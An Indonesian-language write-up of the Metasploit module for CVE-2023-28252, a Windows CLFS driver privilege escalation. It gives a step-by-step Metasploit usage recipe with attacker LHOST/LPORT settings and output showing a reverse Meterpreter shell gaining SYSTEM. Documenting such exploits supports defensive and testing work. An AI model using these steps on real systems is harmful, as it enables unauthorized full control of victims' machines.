# cve_2023_28252_clfs_driver

Sebuah kerentanan eskalasi hak istimewa (`privilege escalation`) ditemukan pada driver `clfs.sys` yang secara default sudah terpasang di sistem operasi `Windows 10 21H2`, `Windows 11 21H2`, dan `Windows Server 20348`.

Driver `clfs.sys` memiliki fungsi bernama `CreateLogFile`, yang digunakan untuk `membuat`, `membuka`, dan `mengedit` file dengan ekstensi `.blf` (`base log format`). Di dalam file `.blf` terdapat berbagai blok data yang mengandung checksum untuk memverifikasi integritas file dan memastikan file tersebut valid.

Namun, file `.blf` ini dapat dimodifikasi menggunakan fungsi seperti `CreateFileA` atau `fopen`, dan diubah dengan `WriteFile` atau `fwrite`. Setelah diubah, checksumnya dapat diperbarui sehingga tetap terlihat valid.

Eksploitasi ini menggunakan dua jenis file .blf yang dimodifikasi dengan cara di atas:
- File `spray.blf`: file khusus ini dibuat untuk memicu `out-of-bounds read`, yakni pembacaan memori di luar batas yang seharusnya. Memori yang dibaca ini berisi pipe baca-tulis (`read-write pipe`) yang diarahkan ke...
- File `trigger.blf`: file inilah yang dirancang untuk membaca token `SYSTEM` dan menulis token tersebut ke proses exploit, menghasilkan eskalasi hak istimewa lokal (`privilege escalation`).

Langkah eksploitasi:

- Pertama, program membuat banyak `read-write pipe` menggunakan `CreatePipe`, yang mengisi memori sebesar `0x90` byte per pipe.
- Kemudian beberapa pipe dibebaskan (`deallocated`), menciptakan celah dalam memori.
- Fungsi `CreateLogFile` dipanggil untuk membuka file `spray.blf`, yang mengisi celah memori tersebut, sehingga terbentuk ruang memori terkontrol.
- Setelah itu, `file trigger.blf` digunakan untuk memicu penulisan token `SYSTEM` ke proses exploit.

Ini adalah penjelasan singkat dan umum mengenai mekanisme exploit. Untuk analisis teknis lebih rinci, silakan merujuk ke:
[https://github.com/fortra/CVE-2023-28252](https://github.com/fortra/CVE-2023-28252)

## Penulis
- Ricardo Narvaja
- Esteban.kazimirow
- jheysel-r7

## Platform
- `Windows`

## Arsitektur
- `x64`

## Cara Penggunaan di Metasploit

```
use exploit/windows/local/cve_2023_28252_clfs_driver
set PAYLOAD <PAYLOAD>
set SESSION <ID>
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is running windows version: 10.0.22000.0 which has a vulnerable version of clfs.sys installed by default
[*] Launching netsh to host the DLL...
[+] Process 8324 launched.
[*] Reflectively injecting the DLL into 8324...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (203846 bytes) to 192.168.1.55
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.16/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] Meterpreter session 9 opened (192.168.1.11:4444 -> 192.168.1.55:61439) at 2025-05-17 21:24:10 +0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/exploit/windows/local/cve_2023_28252_clfs_driver/)
